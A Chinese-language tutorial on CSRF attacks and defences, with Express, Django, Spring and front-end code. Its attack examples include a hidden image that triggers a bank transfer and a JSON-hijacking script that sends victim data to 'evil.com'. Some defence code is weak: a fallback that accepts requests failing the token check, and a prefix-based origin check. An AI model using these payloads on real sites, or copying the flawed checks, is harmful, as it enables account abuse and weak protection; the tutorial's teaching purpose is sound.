---
title: CSRF防护
description: "CSRF 是一种挟持用户在已登录网站上执行非预期操作的攻击方式。攻击者诱导用户访问恶意网站，利用用户已认证的身份，向目标网站发送伪造请求。"
keywords: [CSRF防护]
category: JavaScript
tags: [JavaScript, ES6, 异步, DOM]
---


# CSRF 防护

> CSRF（Cross-Site Request Forgery）跨站请求伪造是一种冒充用户发起恶意请求的攻击方式。

## 一、CSRF 攻击概述

### 1.1 什么是 CSRF

CSRF 是一种挟持用户在已登录网站上执行非预期操作的攻击方式。攻击者诱导用户访问恶意网站，利用用户已认证的身份，向目标网站发送伪造请求。

### 1.2 CSRF 攻击流程

```
┌─────────┐  1.用户登录   ┌─────────┐
│  用户    │ ───────────→ │目标网站  │
└─────────┘              └─────────┘
     │                        │
     │                        ↓ 存储会话
     │                   ┌─────────┐
     │                   │ Cookie  │
     │                   └─────────┘
     │
     │  2.访问恶意网站
     ↓
┌─────────┐  3.自动发送请求  ┌─────────┐
│恶意网站  │ ───────────────→ │目标网站  │
└─────────┘    (携带Cookie)   └─────────┘
                                    │
                                    ↓ 4.执行恶意操作
                               ┌─────────┐
                               │受害者账户│
                               └─────────┘
```

### 1.3 CSRF 与 XSS 的区别

| 特性 | CSRF | XSS |
|------|------|-----|
| 攻击方式 | 伪造用户请求 | 注入恶意脚本 |
| 依赖条件 | 用户已登录 | 脚本被执行 |
| 执行位置 | 攻击者网站 | 目标网站 |
| 能否读取 Cookie | 不能 | 可以 |
| 防护重点 | CSRF Token、SameSite | 输出编码、CSP |

---

## 二、攻击原理与示例

### 2.1 攻击原理

CSRF 攻击的核心原理：
1. 用户在目标网站已登录（有有效的 Cookie）
2. 用户访问恶意网站
3. 恶意网站向目标网站发送请求
4. 浏览器自动携带目标网站的 Cookie
5. 服务器误以为是用户的合法请求

### 2.2 攻击示例

#### 自动提交表单（POST 请求）

```html
<!-- HTML 结构省略，仅展示关键 JS 逻辑 -->
```

#### 图片触发 GET 请求

```html
<!-- 恶意网站 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">

<!-- 社交媒体攻击 -->
<img src="https://social.com/post?content=我是傻瓜&visibility=public">
```

#### 链接诱导点击

```html
<!-- 钓鱼链接 -->
<a href="https://shop.com/buy?item=expensive&quantity=100">
  点击领取优惠券
</a>
```

#### JSON 劫持（旧版本浏览器）

```html
<script>
  // 攻击者可以捕获 JSON 响应（某些旧浏览器）
  function steal(data) {
    fetch('http://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  }
</script>
<script src="https://target.com/api/user/profile?callback=steal"></script>
```

### 2.3 高风险场景

| 场景 | 风险操作 | 潜在损失 |
|------|---------|---------|
| 网上银行 | 转账、支付 | 资金损失 |
| 电子商务 | 下单、修改地址 | 财产损失 |
| 社交媒体 | 发布内容、关注 | 声誉损害 |
| 邮箱系统 | 发送邮件、设置转发 | 隐私泄露 |
| 管理后台 | 修改配置、删除数据 | 系统损坏 |

---

## 三、防护措施详解

### 3.1 CSRF Token

#### 原理

```
1. 服务器生成随机 Token
2. Token 存储在用户会话中
3. Token 嵌入表单或请求头
4. 服务器验证 Token 是否匹配
```

#### 实现（Node.js Express）

```javascript
const express = require('express');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

const app = express();

// 解析 Cookie
app.use(cookieParser());

// CSRF 保护中间件
const csrfProtection = csrf({ cookie: true });

// 表单路由：生成并下发 Token
app.get('/form', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// 敏感接口：先经过 CSRF 校验
app.post('/transfer', csrfProtection, (req, res) => {
  res.json({ success: true });
});

// 校验失败的统一处理
app.use((err, req, res, next) => {
  if (err.code === 'EBADCSRFTOKEN') {
    return res.status(403).json({ error: 'CSRF Token 无效' });
  }
  next(err);
});
```

> 注：csurf 包已宣布不再维护，新项目可自行实现 Token 生成校验，或选用社区维护的替代方案。

#### 前端配合

```javascript
// ==================== 方式1：表单隐藏字段 ====================

// 获取 CSRF Token
async function getCsrfToken() {
  const response = await fetch('/form');
  const data = await response.json();
  return data.csrfToken;
}

// 带 CSRF Token 的 Fetch 封装
async function fetchWithCsrf(url, options = {}) {
  const csrfToken = await getCsrfToken();
  return fetch(url, {
    ...options,
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/json',
      'CSRF-Token': csrfToken,
      ...options.headers
    }
  });
}

// 使用
const response = await fetchWithCsrf('/api/transfer', {
  method: 'POST',
  body: JSON.stringify({ to: 'user123', amount: 100 })
});
```

#### HTML 模板配置

```html
<!DOCTYPE html>
<html>
<head>
  <!-- 在 head 中嵌入 Token -->
  <meta name="csrf-token" content="<%= csrfToken %>">
</head>
<body>
  <form action="/transfer" method="POST">
    <!-- 隐藏字段 -->
    <input type="hidden" name="_csrf" value="<%= csrfToken %>">
    
    <input name="to" placeholder="收款人">
    <input name="amount" type="number" placeholder="金额">
    <button type="submit">转账</button>
  </form>
  
  <script>
    // JavaScript 可以读取 meta 标签中的 Token
    const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
  </script>
</body>
</html>
```

### 3.2 SameSite Cookie 属性

#### SameSite 值详解

| 值 | 跨站请求行为 | 同站请求行为 | 使用场景 |
|---|------------|------------|---------|
| `Strict` | 不发送 Cookie | 发送 Cookie | 高安全要求 |
| `Lax` | GET 导航发送 | 发送 Cookie | 平衡安全与可用性（默认） |
| `None` | 发送 Cookie | 发送 Cookie | 需要跨站 Cookie（需配合 Secure） |

#### 配置示例

```javascript
// Express.js 配置
const express = require('express');
const session = require('express-session');

const app = express();

// Session 配置
app.use(session({
  secret: 'your-secret-key',
  cookie: {
    httpOnly: true,
    secure: true,        // 仅 HTTPS
    sameSite: 'strict',  // 严格模式
    maxAge: 3600000      // 1 小时
  }
}));

// 或手动设置 Cookie
app.get('/login', (req, res) => {
  res.cookie('session', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/',
    maxAge: 3600000
  });
  res.json({ success: true });
});
```

#### SameSite 行为详解

```
SameSite=Strict
├── 从外部网站点击链接 → 不发送 Cookie
├── 外部网站加载图片 → 不发送 Cookie
├── 外部网站提交表单 → 不发送 Cookie
└── 同站内所有请求 → 发送 Cookie

SameSite=Lax
├── 从外部网站点击链接 → 发送 Cookie（GET 导航）
├── 外部网站加载图片 → 不发送 Cookie
├── 外部网站提交表单 → 不发送 Cookie
└── 同站内所有请求 → 发送 Cookie

SameSite=None; Secure
├── 所有跨站请求 → 发送 Cookie
└── 必须配合 Secure 属性使用
```

### 3.3 验证 Referer 和 Origin 头

#### 服务端验证

```javascript
// Express 中间件
function verifyReferer(req, res, next) {
  const allowedOrigins = [
    'https://example.com',
    'https://www.example.com'
  ];
  
  const origin = req.headers.origin || req.headers.referer;
  
  // 允许没有 Referer 的请求（隐私模式等）
  if (!origin) {
    return next();
  }

  const isAllowed = allowedOrigins.some((allowed) => origin.startsWith(allowed));
  if (!isAllowed) {
    return res.status(403).json({ error: '来源校验失败' });
  }
  next();
}

// 应用到敏感路由
app.post('/transfer', verifyReferer, (req, res) => {
  // 处理转账
});
```

#### 安全注意事项

```javascript
// ⚠️ 注意：Referer 可能被伪造或缺失

// 1. 用户隐私设置可能阻止发送 Referer
// 2. HTTPS → HTTP 不发送 Referer
// 3. 某些浏览器插件会修改 Referer

// 推荐做法：Referer 验证作为辅助手段
function csrfProtection(req, res, next) {
  // 主防护：CSRF Token
  if (!validateCsrfToken(req)) {
    // 辅助验证：检查 Referer
    if (!verifyReferer(req)) {
      return res.status(403).json({ error: 'CSRF 验证失败' });
    }
  }
  next();
}
```

### 3.4 二次验证

```javascript
// 重要操作需要二次确认
class SecurityManager {
  /**
   * 发送验证码
   */
  static async sendVerificationCode(userId, action) {
    const code = this.generateCode();
    const expires = Date.now() + 5 * 60 * 1000; // 5 分钟有效

    // 存储验证码
    await redis.set(`verify:${userId}:${action}`, code, 'EX', 300);

    // 通过短信/邮件发送 code（略）
    return true;
  }

  /**
   * 校验验证码
   */
  static async verifyCode(userId, action, code) {
    const stored = await redis.get(`verify:${userId}:${action}`);
    if (stored && stored === code) {
      await redis.del(`verify:${userId}:${action}`);
      return true;
    }
    return false;
  }

  static generateCode() {
    return String(Math.floor(100000 + Math.random() * 900000));
  }
}

// 使用：转账前先校验验证码
app.post('/transfer', async (req, res) => {
  const { to, amount, code } = req.body;

  // 验证码校验
  const ok = await SecurityManager.verifyCode(req.userId, 'transfer', code);
  if (!ok) {
    return res.status(403).json({ error: '验证码错误' });
  }

  // 执行转账
  // ...
});
```

### 3.5 自定义请求头验证

```javascript
// 前端发送自定义头
fetch('/api/sensitive', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest'  // 自定义头
  },
  credentials: 'same-origin'
});

// 服务端验证
app.use((req, res, next) => {
  // 对敏感操作验证自定义头
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    const xRequestedWith = req.headers['x-requested-with'];
    
    if (xRequestedWith !== 'XMLHttpRequest') {
      return res.status(403).json({ error: '非法请求' });
    }
  }
  next();
});
```

---

## 四、防护措施对比

| 防护措施 | 安全性 | 实现复杂度 | 兼容性 | 推荐度 |
|---------|-------|-----------|--------|--------|
| CSRF Token | 高 | 中 | 完全兼容 | ⭐⭐⭐⭐⭐ |
| SameSite Cookie | 高 | 低 | 现代浏览器 | ⭐⭐⭐⭐⭐ |
| Referer 验证 | 中 | 低 | 部分受限 | ⭐⭐⭐ |
| 二次验证 | 高 | 高 | 完全兼容 | ⭐⭐⭐⭐ |
| 自定义请求头 | 中 | 低 | 跨域受限 | ⭐⭐⭐ |

**最佳组合**：CSRF Token + SameSite Cookie + 关键操作二次验证

---

## 五、框架集成方案

### 5.1 Express.js 完整方案

```javascript
const express = require('express');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const helmet = require('helmet');

const app = express();

// 安全中间件
app.use(helmet());
app.use(cookieParser());

// CSRF 保护
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

app.post('/transfer', csrfProtection, (req, res) => {
  res.json({ success: true });
});

// 错误处理
app.use((err, req, res, next) => {
  if (err.code === 'EBADCSRFTOKEN') {
    return res.status(403).json({ 
      error: '请求验证失败，请刷新页面重试' 
    });
  }
  next(err);
});
```

### 5.2 Django 配置

```python
# settings.py

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',  # CSRF 中间件
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

# CSRF 设置
CSRF_COOKIE_SECURE = True      # 仅 HTTPS
CSRF_COOKIE_HTTPONLY = True    # JavaScript 无法读取
CSRF_COOKIE_SAMESITE = 'Strict'

# 配合 SameSite
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Strict'
```

```html
<!-- 模板中使用 -->
<form method="post">
  {% csrf_token %}
  <input name="amount">
  <button type="submit">提交</button>
</form>

<!-- JavaScript 中使用 -->
<script>
const csrftoken = document.querySelector('[name=csrfmiddlewaretoken]').value;

fetch('/api/transfer/', {
  method: 'POST',
  headers: {
    'X-CSRFToken': csrftoken,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ amount: 100 })
});
</script>
```

### 5.3 Spring Boot 配置

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            // CSRF 保护
            .csrf()
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .and()
            .authorizeRequests()
                .anyRequest().authenticated()
                .and()
            .httpBasic();
    }

    @Bean
    public CookieSerializer cookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        serializer.setSameSite("Strict");
        return serializer;
    }
}
```

> 注：`WebSecurityConfigurerAdapter` 在 Spring Security 6 中已被移除，新版本请改用 `SecurityFilterChain` 组件式配置。

```javascript
// 前端获取并使用 Token
fetch('/api/csrf-token')
  .then(res => res.json())
  .then(data => {
    const csrfToken = data.token;
    
    // 保存 Token 供后续使用
    sessionStorage.setItem('csrfToken', csrfToken);
  });

// 发送请求时携带 Token
const token = sessionStorage.getItem('csrfToken');
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-XSRF-TOKEN': token,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ amount: 100 })
});
```

---

## 六、前后端配合最佳实践

### 6.1 Token 管理策略

```javascript
/**
 * CSRF Token 管理器
 */
class CsrfTokenManager {
  constructor() {
    this.token = null;
    this.tokenPromise = null;
  }

  /**
   * 获取 Token（单例模式，避免重复请求）
   */
  getToken() {
    if (this.token) return Promise.resolve(this.token);
    if (!this.tokenPromise) {
      this.tokenPromise = fetch('/api/csrf-token')
        .then((res) => res.json())
        .then((data) => {
          this.token = data.token;
          this.tokenPromise = null;
          return this.token;
        });
    }
    return this.tokenPromise;
  }

  /**
   * Token 失效后重置
   */
  invalidate() {
    this.token = null;
    this.tokenPromise = null;
  }
}

const csrfManager = new CsrfTokenManager();
```

### 6.2 Axios 拦截器配置

```javascript
import axios from 'axios';

// 创建实例
const api = axios.create({
  baseURL: '/api',
  withCredentials: true  // 发送 Cookie
});

// 请求拦截器：自动添加 CSRF Token
api.interceptors.request.use(async (config) => {
  // 仅对非 GET 请求添加 Token
  if (!['get', 'head', 'options'].includes(config.method?.toLowerCase())) {
    const token = await csrfManager.getToken();
    config.headers['CSRF-Token'] = token;
  }
  return config;
});

// 响应拦截器：Token 失效时重置
api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 403) {
      csrfManager.invalidate();
    }
    return Promise.reject(error);
  }
);

export default api;
```

### 6.3 Fetch 封装

```javascript
/**
 * 安全的 Fetch 封装
 */
class SecureFetch {
  constructor(baseUrl) {
    this.baseUrl = baseUrl;
  }

  /**
   * 发送请求
   */
  async request(url, options = {}) {
    const response = await fetch(this.baseUrl + url, {
      credentials: 'same-origin',
      ...options,
      headers: {
        'Content-Type': 'application/json',
        'CSRF-Token': await csrfManager.getToken(),
        ...options.headers
      }
    });
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    return response.json();
  }

  post(url, data) {
    return this.request(url, { method: 'POST', body: JSON.stringify(data) });
  }
}

// 使用
const api = new SecureFetch('/api');
await api.post('/transfer', { to: 'user1', amount: 100 });
```

---

## 七、常见问题解答（FAQ）

### Q1: CSRF Token 应该存储在哪里？

**回答**：有几种常见方式：

| 存储方式 | 优点 | 缺点 | 推荐度 |
|---------|------|------|--------|
| Cookie | 自动发送、简单 | 需要额外保护 | ⭐⭐⭐ |
| Session | 安全、服务端可控 | 占用服务器资源 | ⭐⭐⭐⭐⭐ |
| LocalStorage | 持久化 | XSS 可读取 | ⭐⭐ |
| Meta 标签 | 简单、页面级 | 需要页面刷新 | ⭐⭐⭐⭐ |

**推荐**：Session 存储 + 前端请求头传递。

### Q2: SameSite Cookie 会影响用户体验吗？

**回答**：可能会有以下影响：

```
SameSite=Strict:
- 从外部链接进入时不会自动登录
- 需要重新登录或手动刷新

SameSite=Lax:
- 大部分场景正常工作
- 仅阻止跨站 POST 请求
```

**推荐**：使用 `SameSite=Lax` 作为默认值，敏感操作配合 CSRF Token。

### Q3: 如何处理需要跨站的场景？

**回答**：对于需要跨站 Cookie 的场景（如 OAuth、支付回调）：

```javascript
// 1. 特定 Cookie 允许跨站
res.cookie('oauth_state', state, {
  sameSite: 'none',
  secure: true  // 必须配合 Secure
});

// 2. 使用其他验证方式
// OAuth 使用 state 参数
// 支付使用签名验证
```

### Q4: CSRF Token 和 JWT 如何配合？

**回答**：如果使用 JWT 存储在 localStorage，需要注意：

```javascript
// ⚠️ 不推荐：JWT 存储在 localStorage
// XSS 可以读取并窃取 Token

// ✅ 推荐：JWT 存储在 HttpOnly Cookie
res.cookie('jwt', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// 此时仍需要 CSRF Token 保护
// 因为攻击者可以携带 Cookie 发起请求
```

### Q5: GET 请求需要 CSRF 保护吗？

**回答**：理论上不需要，但前提是：

1. **GET 请求不修改数据**
2. **严格遵循 RESTful 规范**

```javascript
// ❌ 危险：GET 请求修改数据
app.get('/delete/:id', (req, res) => {
  db.delete(req.params.id);
});

// ✅ 安全：使用正确的 HTTP 方法
app.delete('/delete/:id', (req, res) => {
  // 需要 CSRF Token
});
```

### Q6: 如何测试 CSRF 防护是否有效？

**回答**：可以创建测试页面：

```html
<!-- 测试页面（不同域名） -->
<form id="test-form" action="https://target.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>

<script>
  // 尝试提交
  document.getElementById('test-form').submit();
  
  // 如果返回 403 或其他错误，说明防护有效
</script>
```

**预期结果**：请求被拒绝，返回 403 错误。

### Q7: CSRF 防护会影响 API 性能吗？

**回答**：影响很小：

1. **Token 生成**：随机字符串生成，耗时极短
2. **Token 验证**：字符串比对，O(1) 复杂度
3. **内存占用**：Session 存储约占用几 KB

**优化建议**：
- 使用 Redis 存储 Session（分布式）
- Token 复用（同会话内）
- 静态资源不需要 CSRF 保护

---

## 八、安全检测清单

### 开发阶段
- [ ] 所有状态改变操作使用 POST/PUT/DELETE
- [ ] 敏感表单添加 CSRF Token
- [ ] Cookie 配置 SameSite 属性
- [ ] 关键操作实现二次验证

### 测试阶段
- [ ] 使用跨站页面测试攻击
- [ ] 验证 Token 验证逻辑
- [ ] 测试 Token 过期和刷新
- [ ] 验证 SameSite Cookie 生效

### 部署阶段
- [ ] 生产环境启用 Secure Cookie
- [ ] 配置正确的 SameSite 属性
- [ ] 设置 CSRF 错误处理
- [ ] 监控异常请求

---

## 九、参考资料

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN SameSite Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [PortSwigger CSRF Guide](https://portswigger.net/web-security/csrf)

---

> 💡 **提示**：CSRF 防护需要前后端配合。推荐使用 CSRF Token + SameSite Cookie 的组合防护，对高敏感操作增加二次验证。安全防护是一个多层次的过程，没有单一的银弹。
